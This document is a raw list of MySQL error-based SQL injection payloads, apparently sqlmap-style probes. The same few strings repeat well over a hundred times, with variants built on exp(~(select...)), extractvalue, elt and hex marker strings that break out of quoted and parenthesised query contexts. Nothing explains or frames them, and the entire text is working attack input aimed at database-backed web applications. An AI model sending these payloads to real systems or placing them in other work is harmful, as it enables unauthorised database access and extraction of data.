+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
